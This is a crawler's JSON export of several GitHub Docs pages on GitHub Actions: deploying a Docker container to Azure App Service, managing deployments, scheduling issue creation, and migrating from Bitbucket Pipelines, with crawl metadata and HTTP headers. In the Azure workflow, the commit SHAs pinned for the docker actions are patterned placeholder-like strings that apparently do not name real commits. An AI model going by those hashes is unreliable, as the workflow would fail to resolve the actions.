deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment).\n    \n\n## [Creating the workflow](#creating-the-workflow)\n\nOnce you've completed the prerequisites, you can proceed with creating the workflow.\n\nThe following example workflow demonstrates how to build and deploy a Docker container to Azure App Service when there is a push to the `main` branch.\n\nEnsure that you set `AZURE_WEBAPP_NAME` in the workflow `env` key to the name of the web app you created.\n\nIf you configured a deployment environment, change the value of `environment` to be the name of your environment. If you did not configure an environment or if your workflow is in a private repository and you do not use GitHub Enterprise Cloud, delete the `environment` key.\n\nYAML\n\n```\n# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Build and deploy a container to an Azure Web App\n\nenv:\n  AZURE_WEBAPP_NAME: MY_WEBAPP_NAME   # set this to your application's name\n\non:\n  push:\n    branches:\n      - main\n\npermissions:\n  contents: 'read'\n  packages: 'write'\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Docker Buildx\n        uses: docker/setup-buildx-action@7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b\n\n      - name: Log in to GitHub container registry\n        uses: docker/login-action@8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d\n        with:\n          registry: ghcr.io\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}\n\n      - name: Lowercase the repo name\n        run: echo \"REPO=${GITHUB_REPOSITORY,,}\" >>${GITHUB_ENV}\n\n      - name: Build and push container image to registry\n        uses: docker/build-push-action@9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f\n        with:\n          push: true\n          tags: ghcr.io/${{ env.REPO }}:${{ github.sha }}\n          file: ./Dockerfile\n\n  deploy:\n    runs-on: ubuntu-latest\n\n    needs: build\n\n    environment:\n      name: 'production'\n      url: ${{ steps.deploy-to-webapp.outputs.webapp-url }}\n\n    steps:\n      - name: Lowercase the repo name\n        run: echo \"REPO=${GITHUB_REPOSITORY,,}\" >>${GITHUB_ENV}\n\n      - name: Deploy to Azure Web App\n        id: deploy-to-webapp\n        uses: azure/webapps-deploy@85270a1854658d167ab239bce43949edb336fa7c\n        with:\n          app-name: ${{ env.AZURE_WEBAPP_NAME }}\n          publish-profile: ${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}\n          images: 'ghcr.io/${{ env.REPO }}:${{ github.sha }}'\n```\n\n## [Additional resources](#additional-resources)\n\nThe following resources may also be useful:\n\n*   For the original workflow template, see [`azure-container-webapp.yml`](https://github.com/actions/starter-workflows/blob/main/deployments/azure-container-webapp.yml) in the GitHub Actions `starter-workflows` repository.\n*   The action used to deploy the web app is the official Azure [`Azure/webapps-deploy`](https://github.com/Azure/webapps-deploy) action.\n*   For more examples of GitHub Action workflows that deploy to Azure, see the [actions-workflow-samples](https://github.com/Azure/actions-workflow-samples) repository.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 248,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-docker-to-azure-app-service-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-docker-to-azure-app-service-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-docker-to-azure-app-service-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-docker-to-azure-app-service-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-docker-to-azure-app-service-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 11664,
      "readableText": 11318,
      "none": 37563,
      "readableTextIfPossible": 37563,
      "result": 11318,
      "markdown": 8358
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments",
    "loadedTime": "2025-05-08T06:40:33.114Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments",
    "title": "Managing deployments - GitHub Docs",
    "description": "View your deployment history and configure rules to protect your deployments.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Managing deployments - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "4314:23AB9D:1A4CB:21509:681C51D8",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:40:24 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686425.532302, VS0, VE341",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "22965",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Managing deployments - GitHub Docs\nView your deployment history and configure rules to protect your deployments.\nManaging environments for deployment\nYou can create environments and secure those environments with deployment protection rules. A job that references an environment must follow any protection rules for the environment before running or accessing the environment's secrets.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-qm7ij.html",
  "markdown": "# Managing deployments - GitHub Docs\n\nView your deployment history and configure rules to protect your deployments.\n\n## [Managing environments for deployment](https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment)\n\nYou can create environments and secure those environments with deployment protection rules. A job that references an environment must follow any protection rules for the environment before running or accessing the environment's secrets.",
  "debug": {
    "pageType": "Category",
    "pageTypeReason": "None",
    "totalLinks": 230,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 1719,
      "readableText": 800,
      "none": 21553,
      "readableTextIfPossible": 21553,
      "result": 800,
      "markdown": 529
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/project-management/scheduling-issue-creation",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/project-management/scheduling-issue-creation",
    "loadedTime": "2025-05-08T06:40:36.929Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/project-management/scheduling-issue-creation",
    "title": "Scheduling issue creation - GitHub Docs",
    "description": "You can use GitHub Actions to create an issue on a regular basis for things like daily meetings or quarterly reviews.",
    "author": null,
    "keywords": "Workflows,Project management",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Scheduling issue creation - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/project-management/scheduling-issue-creation"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/project-management/scheduling-issue-creation"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "1C04:60A98:1A99A:21BD6:681C51DB",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:40:28 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686428.611261, VS0, VE425",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "27938",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Scheduling issue creation - GitHub Docs\nYou can use GitHub Actions to create an issue on a regular basis for things like daily meetings or quarterly reviews.\nIntroduction\nThis tutorial demonstrates how to use the GitHub CLI to create an issue on a regular basis. For example, you can create an issue each week to use as the agenda for a team meeting. For more information about GitHub CLI, see Using GitHub CLI in workflows.\nIn the tutorial, you will first make a workflow file that uses the GitHub CLI. Then, you will customize the workflow to suit your needs.\nCreating the workflow\nChoose a repository where you want to apply this project management workflow. You can use an existing repository that you have write access to, or you can create a new repository. For more information about creating a repository, see Creating a new repository.\nIn your repository, create a file called .github/workflows/YOUR_WORKFLOW.yml, replacing YOUR_WORKFLOW with a name of your choice. This is a workflow file. For more information about creating new files on GitHub, see Creating new files.\nCopy the following YAML contents into your workflow file.\nYAML\nname: Weekly Team Sync on: schedule: - cron: 20 07 * * 1 jobs: create_issue: name: Create team sync issue runs-on: ubuntu-latest permissions: issues: write steps: - name: Create team sync issue run: | if [[ $CLOSE_PREVIOUS == true ]]; then previous_issue_number=$(gh issue list \\ --label \"$LABELS\" \\ --json number \\ --jq '.[0].number') if [[ -n $previous_issue_number ]]; then gh issue close \"$previous_issue_number\" gh issue unpin \"$previous_issue_number\" fi fi new_issue_url=$(gh issue create \\ --title \"$TITLE\" \\ --assignee \"$ASSIGNEES\" \\ --label \"$LABELS\" \\ --body \"$BODY\") if [[ $PINNED == true ]]; then gh issue pin \"$new_issue_url\" fi env: GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} GH_REPO: ${{ github.repository }} TITLE: Team sync ASSIGNEES: monalisa,doctocat,hubot LABELS: weekly sync,docs-team BODY: | ### Agenda - [ ] Start the recording - [ ] Check-ins - [ ] Discussion points - [ ] Post the recording ### Discussion Points Add things to discuss below - [Work this week](https://github.com/orgs/github/projects/3) PINNED: false CLOSE_PREVIOUS: false \nCustomize the parameters in your workflow file:\nChange the value for on.schedule to dictate when you want this workflow to run. In the example above, the workflow will run every Monday at 7:20 UTC. For more information about scheduled workflows, see Events that trigger workflows.\nChange the value for ASSIGNEES to the list of GitHub usernames that you want to assign to the issue.\nChange the value for LABELS to the list of labels that you want to apply to the issue.\nChange the value for TITLE to the title that you want the issue to have.\nChange the value for BODY to the text that you want in the issue body. The | character allows you to use a multi-line value for this parameter.\nIf you want to pin this issue in your repository, set PINNED to true. For more information about pinned issues, see Pinning an issue to your repository.\nIf you want to close the previous issue generated by this workflow each time a new issue is created, set CLOSE_PREVIOUS to true. The workflow will close the most recent issue that has the labels defined in the labels field. To avoid closing the wrong issue, use a unique label or combination of labels.\nCommit your workflow file to the default branch of your repository. For more information, see Creating new files.\nExpected results\nBased on the schedule parameter (for example, every Monday at 7:20 UTC), your workflow will create a new issue with the assignees, labels, title, and body that you specified. If you set PINNED to true, the workflow will pin the issue to your repository. If you set CLOSE_PREVIOUS to true, the workflow will close the most recent issue with matching labels.\nNote\nThe schedule event can be delayed during periods of high loads of GitHub Actions workflow runs. High load times include the start of every hour. If the load is sufficiently high enough, some queued jobs may be dropped. To decrease the chance of delay, schedule your workflow to run at a different time of the hour.\nYou can view the history of your workflow runs to see this workflow run periodically. For more information, see Viewing workflow run history.\nNext steps\nTo learn more about additional things you can do with the GitHub CLI, like using an issue template, see the gh issue create documentation.\nSearch GitHub Marketplace for actions related to scheduled issues.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-scheduling-issue-creation-jiq4c.html",
  "markdown": "# Scheduling issue creation - GitHub Docs\n\nYou can use GitHub Actions to create an issue on a regular basis for things like daily meetings or quarterly reviews.\n\n## [Introduction](#introduction)\n\nThis tutorial demonstrates how to use the GitHub CLI to create an issue on a regular basis. For example, you can create an issue each week to use as the agenda for a team meeting. For more information about GitHub CLI, see [Using GitHub CLI in workflows](https://docs.github.com/en/actions/using-workflows/using-github-cli-in-workflows).\n\nIn the tutorial, you will first make a workflow file that uses the GitHub CLI. Then, you will customize the workflow to suit your needs.\n\n## [Creating the workflow](#creating-the-workflow)\n\n1.  Choose a repository where you want to apply this project management workflow. You can use an existing repository that you have write access to, or you can create a new repository. For more information about creating a repository, see [Creating a new repository](https://docs.github.com/en/repositories/creating-and-managing-repositories/creating-a-new-repository).\n    \n2.  In your repository, create a file called `.github/workflows/YOUR_WORKFLOW.yml`, replacing `YOUR_WORKFLOW` with a name of your choice. This is a workflow file. For more information about creating new files on GitHub, see [Creating new files](https://docs.github.com/en/repositories/working-with-files/managing-files/creating-new-files).\n    \n3.  Copy the following YAML contents into your workflow file.\n    \n    YAML\n    \n    ```\n    name: Weekly Team Sync\n    on:\n      schedule:\n        - cron: 20 07 * * 1\n    \n    jobs:\n      create_issue:\n        name: Create team sync issue\n        runs-on: ubuntu-latest\n        permissions:\n          issues: write\n        steps:\n          - name: Create team sync issue\n            run: |\n              if [[ $CLOSE_PREVIOUS == true ]]; then\n                previous_issue_number=$(gh issue list \\\n                  --label \"$LABELS\" \\\n                  --json number \\\n                  --jq '.[0].number')\n                if [[ -n $previous_issue_number ]]; then\n                  gh issue close \"$previous_issue_number\"\n                  gh issue unpin \"$previous_issue_number\"\n                fi\n              fi\n              new_issue_url=$(gh issue create \\\n                --title \"$TITLE\" \\\n                --assignee \"$ASSIGNEES\" \\\n                --label \"$LABELS\" \\\n                --body \"$BODY\")\n              if [[ $PINNED == true ]]; then\n                gh issue pin \"$new_issue_url\"\n              fi\n            env:\n              GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n              GH_REPO: ${{ github.repository }}\n              TITLE: Team sync\n              ASSIGNEES: monalisa,doctocat,hubot\n              LABELS: weekly sync,docs-team\n              BODY: |\n                ### Agenda\n    \n                - [ ] Start the recording\n                - [ ] Check-ins\n                - [ ] Discussion points\n                - [ ] Post the recording\n    \n                ### Discussion Points\n                Add things to discuss below\n    \n                - [Work this week](https://github.com/orgs/github/projects/3)\n              PINNED: false\n              CLOSE_PREVIOUS: false\n    ```\n    \n4.  Customize the parameters in your workflow file:\n    \n    *   Change the value for `on.schedule` to dictate when you want this workflow to run. In the example above, the workflow will run every Monday at 7:20 UTC. For more information about scheduled workflows, see [Events that trigger workflows](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#scheduled-events).\n    *   Change the value for `ASSIGNEES` to the list of GitHub usernames that you want to assign to the issue.\n    *   Change the value for `LABELS` to the list of labels that you want to apply to the issue.\n    *   Change the value for `TITLE` to the title that you want the issue to have.\n    *   Change the value for `BODY` to the text that you want in the issue body. The `|` character allows you to use a multi-line value for this parameter.\n    *   If you want to pin this issue in your repository, set `PINNED` to `true`. For more information about pinned issues, see [Pinning an issue to your repository](https://docs.github.com/en/issues/tracking-your-work-with-issues/pinning-an-issue-to-your-repository).\n    *   If you want to close the previous issue generated by this workflow each time a new issue is created, set `CLOSE_PREVIOUS` to `true`. The workflow will close the most recent issue that has the labels defined in the `labels` field. To avoid closing the wrong issue, use a unique label or combination of labels.\n5.  Commit your workflow file to the default branch of your repository. For more information, see [Creating new files](https://docs.github.com/en/repositories/working-with-files/managing-files/creating-new-files).\n    \n\n## [Expected results](#expected-results)\n\nBased on the `schedule` parameter (for example, every Monday at 7:20 UTC), your workflow will create a new issue with the assignees, labels, title, and body that you specified. If you set `PINNED` to `true`, the workflow will pin the issue to your repository. If you set `CLOSE_PREVIOUS` to true, the workflow will close the most recent issue with matching labels.\n\nNote\n\nThe `schedule` event can be delayed during periods of high loads of GitHub Actions workflow runs. High load times include the start of every hour. If the load is sufficiently high enough, some queued jobs may be dropped. To decrease the chance of delay, schedule your workflow to run at a different time of the hour.\n\nYou can view the history of your workflow runs to see this workflow run periodically. For more information, see [Viewing workflow run history](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/viewing-workflow-run-history).\n\n## [Next steps](#next-steps)\n\n*   To learn more about additional things you can do with the GitHub CLI, like using an issue template, see the [`gh issue create` documentation](https://cli.github.com/manual/gh_issue_create).\n*   [Search GitHub Marketplace](https://github.com/marketplace?category=&type=actions&verification=&query=schedule+issue) for actions related to scheduled issues.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasMinWordsCrawleeHtmlToText",
    "totalLinks": 244,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-scheduling-issue-creation-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-scheduling-issue-creation-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-scheduling-issue-creation-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-scheduling-issue-creation-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-scheduling-issue-creation-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 8354,
      "readableText": 8039,
      "none": 31191,
      "readableTextIfPossible": 31191,
      "result": 8039,
      "markdown": 6284
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer",
    "loadedTime": "2025-05-08T06:40:40.123Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer",
    "title": "Migrating from Bitbucket Pipelines with GitHub Actions Importer - GitHub Docs",
    "description": "Learn how to use GitHub Actions Importer to automate the migration of your Bitbucket pipelines to GitHub Actions.",
    "author": null,
    "keywords": "Migration,CI,CD",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Migrating from Bitbucket Pipelines with GitHub Actions Importer - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "FD36:210E8D:1A775:21BC4:681C51DF",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:40:31 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686431.324780, VS0, VE426",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "36018",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Migrating from Bitbucket Pipelines with GitHub Actions Importer\nLearn how to use GitHub Actions Importer to automate the migration of your Bitbucket pipelines to GitHub Actions.\nLegal notice\nAbout migrating from Bitbucket Pipelines with GitHub Actions Importer\nThe instructions below will guide you through configuring your environment to use GitHub Actions Importer to migrate Bitbucket Pipelines to GitHub Actions.\nPrerequisites\nAn environment where you can run Linux-based containers, and can install the necessary tools. \nDocker is installed and running.\nGitHub CLI is installed.\nNote\nThe GitHub Actions Importer container and CLI do not need to be installed on the same server as your CI platform.\nLimitations\nThere are some limitations when migrating from Bitbucket Pipelines to GitHub Actions with GitHub Actions Importer.\nImages in a private AWS ECR are not supported.\nThe Bitbucket Pipelines option size is not supported. If additional runner resources are required in GitHub Actions, consider using larger runners. For more information, see Using larger runners.\nMetrics detailing the queue time of jobs is not supported by the forecast command.\nBitbucket after-scripts are supported using GitHub Actions always() in combination with checking the steps.<step_id>.conclusion of the previous step. For more information, see Accessing contextual information about workflow runs.\nThe following is an example of using the always() with steps.<step_id>.conclusion.\n- name: After Script 1 run: |- echo \"I'm after the script ran!\" echo \"We should be grouped!\" id: after-script-1 if: \"${{ always() }}\" - name: After Script 2 run: |- echo \"this is really the end\" echo \"goodbye, for now!\" id: after-script-2 if: \"${{ steps.after-script-1.conclusion == 'success' && always() }}\" \nManual tasks\nCertain Bitbucket Pipelines constructs must be migrated manually. These include:\nSecured repository, workspace, and deployment variables\nSSH keys\nInstalling the GitHub Actions Importer CLI extension\nInstall the GitHub Actions Importer CLI extension:\nBash\ngh extension install github/gh-actions-importer \nVerify that the extension is installed:\n$ gh actions-importer -h Options: -?, -h, --help Show help and usage information Commands: update Update to the latest version of GitHub Actions Importer. version Display the version of GitHub Actions Importer. configure Start an interactive prompt to configure credentials used to authenticate with your CI server(s). audit Plan your CI/CD migration by analyzing your current CI/CD footprint. forecast Forecast GitHub Actions usage from historical pipeline utilization. dry-run Convert a pipeline to a GitHub Actions workflow and output its yaml file. migrate Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes. \nConfiguring credentials\nThe configure CLI command is used to set required credentials and options for GitHub Actions Importer when working with Bitbucket Pipelines and GitHub.\nCreate a GitHub personal access token (classic). For more information, see Managing your personal access tokens.\nYour token must have the workflow scope.\nAfter creating the token, copy it and save it in a safe location for later use.\nCreate a Workspace Access Token for Bitbucket Pipelines. For more information, see Workspace Access Token permissions in the Bitbucket documentation. Your token must have the read scope for pipelines, projects, and repositories.\nIn your terminal, run the GitHub Actions Importer configure CLI command:\ngh actions-importer configure \nThe configure command will prompt you for the following information:\nFor \"Which CI providers are you configuring?\", use the arrow keys to select Bitbucket, press Space to select it, then press Enter.\nFor \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and press Enter.\nFor \"Base url of the GitHub instance\", press Enter to accept the default value (https://github.com).\nFor \"Personal access token for Bitbucket\", enter the Workspace Access Token that you created earlier, and press Enter.\nFor \"Base url of the Bitbucket instance\", enter the URL for your Bitbucket instance, and press Enter.\nAn example of the configure command is shown below:\n$ gh actions-importer configure ✔ Which CI providers are you configuring?: Bitbucket Enter the following values (leave empty to omit): ✔ Personal access token for GitHub: *************** ✔ Base url of the GitHub instance: https://github.com ✔ Personal access token for Bitbucket: ******************** ✔ Base url of the Bitbucket instance: https://bitbucket.example.com Environment variables successfully updated. \nIn your terminal, run the GitHub Actions Importer update CLI command to connect to GitHub Packages Container registry and ensure that the container image is updated to the latest version:\ngh actions-importer update \nThe output of the command should be similar to below:\nUpdating ghcr.io/actions-importer/cli:latest... ghcr.io/actions-importer/cli:latest up-to-date \nPerform an audit of the Bitbucket instance\nYou can use the audit command to get a high-level view of pipelines in a Bitbucket instance.\nThe audit command performs the following steps.\nFetches all of the pipelines for a workspace.\nConverts pipeline to its equivalent GitHub Actions workflow.\nGenerates a report that summarizes how complete and complex of a migration is possible with GitHub 